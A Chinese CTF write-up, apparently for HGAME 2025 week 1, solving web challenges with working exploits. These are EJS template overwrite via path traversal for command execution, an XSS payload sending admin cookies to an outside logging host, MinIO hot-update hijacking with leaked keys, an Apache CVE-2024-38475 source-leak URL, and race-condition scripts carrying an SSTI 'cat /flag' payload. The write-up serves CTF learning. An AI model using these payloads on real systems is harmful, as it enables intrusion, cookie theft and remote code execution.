+++
date = '2025-02-20T00:27:55+08:00'
title = 'HGAME2025 WEEK1'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++
## Web

### week1

### Level 24 Pacman

拿到环境

![image-20250206151704506](../assets/image-20250206151704506.png)

一个小游戏，猜测应该是js审计

![image-20250206151846623](../assets/image-20250206151846623.png)

查看index.js发现代码进行了混淆

可以用工具反混淆一下，增加一下可读性

https://tool.yuanrenxue.cn/decode_obfuscator



![image-20250206152531656](../assets/image-20250206152531656.png)

反混淆之后找到这个

![image-20250206152608227](../assets/image-20250206152608227.png)

感觉是栅栏，解密拿到flag

![image-20250206152742122](../assets/image-20250206152742122.png)



### Level 47 BandBomb



文件上传



![image-20250206152938301](../assets/image-20250206152938301.png)



附件有源码



```js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();

app.set('view engine', 'ejs');

app.use('/static', express.static(path.join(__dirname, 'public')));
app.use(express.json());

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = 'uploads';
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir);
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  }
});

const upload = multer({ 
  storage: storage,
  fileFilter: (_, file, cb) => {
    try {
      if (!file.originalname) {
        return cb(new Error('无效的文件名'), false);
      }
      cb(null, true);
    } catch (err) {
      cb(new Error('文件处理错误'), false);
    }
  }
});

app.get('/', (req, res) => {
  const uploadsDir = path.join(__dirname, 'uploads');
  
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir);
  }

  fs.readdir(uploadsDir, (err, files) => {
    if (err) {
      return res.status(500).render('mortis', { files: [] });
    }
    res.render('mortis', { files: files });
  });
});

app.post('/upload', (req, res) => {
  upload.single('file')(req, res, (err) => {
    if (err) {
      return res.status(400).json({ error: err.message });
    }
    if (!req.file) {
      return res.status(400).json({ error: '没有选择文件' });
    }
    res.json({ 
      message: '文件上传成功',
      filename: req.file.filename 
    });
  });
});

app.post('/rename', (req, res) => {
  const { oldName, newName } = req.body;
  const oldPath = path.join(__dirname, 'uploads', oldName);
  const newPath = path.join(__dirname, 'uploads', newName);

  if (!oldName || !newName) {
    return res.status(400).json({ error: ' ' });
  }

  fs.rename(oldPath, newPath, (err) => {
    if (err) {
      return res.status(500).json({ error: ' ' + err.message });
    }
    res.json({ message: ' ' });
  });
});

app.listen(port, () => {
  console.log(`服务器运行在 http://localhost:${port}`);
});

```

这题有点像24国赛的ezjs

[文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区](https://xz.aliyun.com/news/14569)

可以看到在 /rename 路由

```js
app.post('/rename', (req, res) => {
  const { oldName, newName } = req.body;
  const oldPath = path.join(__dirname, 'uploads', oldName);
  const newPath = path.join(__dirname, 'uploads', newName);

  if (!oldName || !newName) {
    return res.status(400).json({ error: ' ' });
  }

  fs.rename(oldPath, newPath, (err) => {
    if (err) {
      return res.status(500).json({ error: ' ' + err.message });
    }
    res.json({ message: ' ' });
  });
});
```



这个路由会将uploads目录中的文件重命名

我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名

也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE

eval.ejs

```
<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
    <div>
        <%= process.mainModule.require('child_process').execSync('whoami') %>
    </div>
</body>
</html>
```

将ejs上传

![image-20250206154845681](../assets/image-20250206154845681.png)

覆写原来的ejs

![image-20250206155252476](../assets/image-20250206155252476.png)

访问/

![image-20250206155341848](../assets/image-20250206155341848.png)

这题flag藏在环境变量里

payload:

```
<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
    <div>
        <%= process.mainModule.require('child_process').execSync('printenv') %>
    </div>
</body>
</html>
```





![image-20250206155810074](../assets/image-20250206155810074.png)



### Level 69 MysteryMessageBoard

密码爆破，XSS cookie窃取

![image-20250206160024933](../assets/image-20250206160024933.png)

爆出来 shallot/888888

登进去看到一个留言板

![image-20250206160118188](../assets/image-20250206160118188.png)

猜测是xss，测试一下

```
<script>alert('XSS')</script> 
```

![image-20250206160225628](../assets/image-20250206160225628.png)

同时通过dirsearch扫到了/admin路由

![image-20250206160449456](../assets/image-20250206160449456.png)

![image-20250206160507469](../assets/image-20250206160507469.png)

根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板

也就是说我们可以进行cookie窃取

payload:

```
<script>document.location='http://dfny33.ceye.io?'+document.cookie;</script>
```

将payload输出在留言板，然后访问/admin

![f01e1737d9537ace6383c2aa28b8be2](../assets/f01e1737d9537ace6383c2aa28b8be2.jpg)

成功拿到admin的cookie

拿admin的cookie访问/flag即可拿到flag



### Level 25 双面人派对

![image-20250206161540205](../assets/image-20250206161540205.png)

这道题有两个环境，一开始以为是re，其实感觉更像是misc

访问app.service-web可以拿到一个main文件

是一个elf文件

用exeinfo PE查到用upx加壳了

![image-20250206161827725](../assets/image-20250206161827725.png)

用upx官方工具就可以脱壳

https://github.com/upx/upx/releases/latest

脱壳之后用ida打开

![image-20250206162100313](../assets/image-20250206162100313.png)

可以找到一段关于minio的密钥信息

```
.noptrdata:0000000000D614E0	000000AA	C	minio:\r\n  endpoint: \"127.0.0.1:9000\"\r\n  access_key: \"minio_admin\"\r\n  secret_key: \"JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\"\r\n  bucket: \"prodbucket\"\r\n  key: \"update\" 
```

那我们大概就能猜到另一个环境应该就是这个minio的服务

用mc通过Access Key和Secret Key连接上去

![image-20250206162349506](../assets/image-20250206162349506.png)

里面有两个储存桶

![image-20250206162644906](../assets/image-20250206162644906.png)

将两个储存桶都下载下来

![image-20250206162716208](../assets/image-20250206162716208.png)

/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新

看一下源码

```go
package main

import (
	"level25/fetch"
	"level25/conf"
	"github.com/gin-gonic/gin"
	"github.com/jpillora/overseer"
)

func main() {
	fetcher := &fetch.MinioFetcher{
		Bucket:    conf.MinioBucket,
		Key:       conf.MinioKey,
		Endpoint:  conf.MinioEndpoint,
		AccessKey: conf.MinioAccessKey,
		SecretKey: conf.MinioSecretKey,
	}
	overseer.Run(overseer.Config{
		Program: program,
		Fetcher: fetcher,
	})

}

func program(state overseer.State) {
	g := gin.Default()
	g.StaticFS("/", gin.Dir(".", true))
	g.Run(":8080")
}

```

我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录

我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了

payload:

```
package main

import (
	"level25/fetch"
	"level25/conf"
	"github.com/gin-gonic/gin"
	"github.com/jpillora/overseer"
)

func main() {
	fetcher := &fetch.MinioFetcher{
		Bucket:    conf.MinioBucket,
		Key:       conf.MinioKey,
		Endpoint:  conf.MinioEndpoint,
		AccessKey: conf.MinioAccessKey,
		SecretKey: conf.MinioSecretKey,
	}
	overseer.Run(overseer.Config{
		Program: program,
		Fetcher: fetcher,
	})

}

func program(state overseer.State) {
	g := gin.Default()
	g.StaticFS("/abc", gin.Dir("/", true))
	g.Run(":8080")
}

```

这里我将/路由改成了/abc，因为不知道为啥我用/路由不行

将源码编译后覆写到储存桶上

![image-20250206163859652](../assets/image-20250206163859652.png)

访问/abc

![image-20250206164000985](../assets/image-20250206164000985.png)

拿到flag

![image-20250206164029974](../assets/image-20250206164029974.png)



### Level 38475 角落

ssti/条件竞争

![image-20250206164229496](../assets/image-20250206164229496.png)

/robots.txt有个/app.conf

![image-20250206164257706](../assets/image-20250206164257706.png)

访问/app.conf

![image-20250206164413970](../assets/image-20250206164413970.png)

这里展示了httpd.conf的片段

这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露

同时在响应标头能找到Apache的版本信息

![image-20250206164739551](../assets/image-20250206164739551.png)

可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关

CVE-2024-38475

![image-20250206165000233](../assets/image-20250206165000233.png)

网上没找到什么poc

但是可以找到漏洞发现者的一篇文章

https://blog.orange.tw/posts/2024-08-confusion-attacks-en/

![2dbfbdadba8694e40ae73db901c8c4e](../assets/2dbfbdadba8694e40ae73db901c8c4e.jpg)

根据这篇文章我们可以构造出paylaod

```
http://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F
```

这道题多了一个**RewriteCond "%{HTTP_USER_AGENT}" "^L1nk/"**，只需要在user-agent前面加上L1nk/即可

![image-20250206165543890](../assets/image-20250206165543890.png)

拿到源码

```python
from flask import Flask, request, render_template, render_template_string, redirect
import os
import templates

app = Flask(__name__)
pwd = os.path.dirname(__file__)
show_msg = templates.show_msg


def readmsg():
	filename = pwd + "/tmp/message.txt"
	if os.path.exists(filename):
		f = open(filename, 'r')
		message = f.read()
		f.close()
		return message
	else:
		return 'No message now.'


@app.route('/index', methods=['GET'])
def index():
	status = request.args.get('status')
	if status is None:
		status = ''
	return render_template("index.html", status=status)


@app.route('/send', methods=['POST'])
def write_message():
	filename = pwd + "/tmp/message.txt"
	message = request.form['message']

	f = open(filename, 'w')
	f.write(message) 
	f.close()

	return redirect('index?status=Send successfully!!')
	
@app.route('/read', methods=['GET'])
def read_message():
	if "{" not in readmsg():
		show = show_msg.replace("{{message}}", readmsg())
		return render_template_string(show)
	return 'waf!!'
	

if __name__ == '__main__':
	app.run(host = '0.0.0.0', port = 5000)
```

可以看到/read路由存在ssti，但是他waf掉了最重要的{

但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了

接下来就是搓脚本发包

三个脚本

poc1

```python
import requests
while True:
    burp0_url = "http://node1.hgame.vidar.club:30762/app/send"
    burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "zh-CN,zh;q=0.9", "Origin": "http://node1.hgame.vidar.club:30762", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://node1.hgame.vidar.club:30762/app/index", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"message": "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"}
    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(res.status_code)
    
```

poc2

```python
import requests
while True:
    burp0_url = "http://node1.hgame.vidar.club:30762/app/send"
    burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "zh-CN,zh;q=0.9", "Origin": "http://node1.hgame.vidar.club:30762", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://node1.hgame.vidar.club:30762/app/index", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"message": "123"}
    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(res.status_code)
```

poc3

```python
import requests
while True:
    burp0_url = "http://node1.hgame.vidar.club:30762/app/read"
    burp0_headers = {"Accept-Language": "zh-CN,zh;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    res = requests.get(burp0_url, headers=burp0_headers)
    # print(res.text)
    if "hgame" in (res.text):
        print(res.text)
        break

```

成功执行，拿到flag

![ce7c9af5b1c85c5b5c60632c51b313a](../assets/ce7c9af5b1c85c5b5c60632c51b313a.png)

